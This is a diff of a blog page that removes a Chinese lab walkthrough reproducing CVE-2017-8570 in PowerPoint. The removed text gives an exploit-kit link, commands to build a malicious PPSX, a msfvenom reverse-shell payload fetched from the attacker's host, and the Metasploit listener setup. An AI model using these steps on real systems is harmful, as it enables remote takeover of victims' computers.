@@ -72,18 +72,15 @@
     </header>
     <div class="entry">
       
-        <h1 id="漏洞背景："><a href="#漏洞背景：" class="headerlink" title="漏洞背景："></a>漏洞背景：</h1><p>2017年7月，微软在例行的月度补丁中修复了多个Microsoft Office漏洞，其中一个编号为CVE-2017-8570的漏洞是一个逻辑漏洞，利用方法简单，影响范围广。由于该漏洞和三年前的SandWorm（沙虫）漏洞非常类似，因此被称之为“沙虫”二代漏洞。2017年7月下旬，有国外黑客在github上传了CVE-2017-8570漏洞的利用代码，但随即删除；7月29日，有多利用该漏洞的恶意文件开始在互联网上传播。<br>该漏洞为Microsoft Office的一个远程代码执行漏洞。其成因是Microsoft PowerPoint执行时会初始化“Script”Moniker对象，而在PowerPoint播放动画期间会激活该对象，从而执行sct脚本（Windows Script Component）文件。<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furwvs9yoyj30tz073mxq.jpg" alt=""></p>
-<h1 id="相关工具使用"><a href="#相关工具使用" class="headerlink" title="相关工具使用"></a>相关工具使用</h1><p>本次漏洞复现需要用到VMware Workstation来搭建两个虚拟机，一个win7作为靶机（需要安装office PowerPoint 2016及以前的版本）和一个Kali作为攻击机（版本使用2.0），以及kali自带渗透工具MSF。<br>附上exp下载链接：<a href="https://github.com/tezukanice/Office8570.git" target="_blank" rel="noopener">https://github.com/tezukanice/Office8570.git</a></p>
-<hr>
-<h1 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h1><h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><p>首先在kali中获取IP地址。使用命令”python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u <a href="http://192.168.237.129/logo.doc&quot;在攻击机中生成包含恶意代码的PPSX文件。![](https://ws1.sinaimg.cn/large/006bMmGagy1furxdfbqu8j30qr0c9gq8.jpg)" target="_blank" rel="noopener">http://192.168.237.129/logo.doc&quot;在攻击机中生成包含恶意代码的PPSX文件。![](https://ws1.sinaimg.cn/large/006bMmGagy1furxdfbqu8j30qr0c9gq8.jpg)</a>  </p>
-<h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><p>使用命令msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.237.129 LPORT=6666 -f exe &gt; shell.exe在攻击机中生成反弹shell的exe文件，6666为攻击机的监听端口（端口可随意）。<img src="https://ws1.sinaimg.cn/large/006bMmGagy1furxgd80w5j30mn0bg77x.jpg" alt=""></p>
-<h4 id="三"><a href="#三" class="headerlink" title="三"></a>三</h4><p>监听来自ppsx执行反弹shell，使用命令：python cve-2017-8570_toolkit.py -M exp -e <a href="http://192.168.237.129/shell.exe" target="_blank" rel="noopener">http://192.168.237.129/shell.exe</a> -l shell.exe<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furxh7p2usj30ku065q46.jpg" alt=""></p>
-<h4 id="四"><a href="#四" class="headerlink" title="四"></a>四</h4><p>开启msf，使用命令：msfconsole<img src="https://ws1.sinaimg.cn/large/006bMmGagy1furxhqj8m7j30ky0e5act.jpg" alt=""><br>分别使用如下命令设置监听：<br>~ msfconsole<br>msf &gt; use exploit/multi/handler<br>msf &gt; set LHOST 192.168.237.129<br>msf &gt; set LPORT 6666<br>msf &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>msf &gt; exploit<br>开启监听</p>
-<h4 id="五"><a href="#五" class="headerlink" title="五"></a>五</h4><p>最后将包含恶意代码的PPTX发送给靶机并在靶机上打开。<br>攻击成功<img src="https://ws1.sinaimg.cn/large/006bMmGagy1furxk8elf3j30lb07nwfo.jpg" alt="">  </p>
-<p>攻击成功后可以在靶机上执行各种shell命令，测试中我使用了md test，<br>效果如图：<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furxlqrvt1j31hc0pnb2a.jpg" alt=""><br>至此漏洞复现完成</p>
-
+        <p><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furwvs9yoyj30tz073mxq.jpg" alt=""><br>
       
     </div>
+    
+    <footer>
+      <div class="alignleft">
+        <a href="/2018/07/30/2017-8570/#more" class="more-link">More</a>
+      </div>
+    </footer>
     
     <footer>
         <div class="alignright">
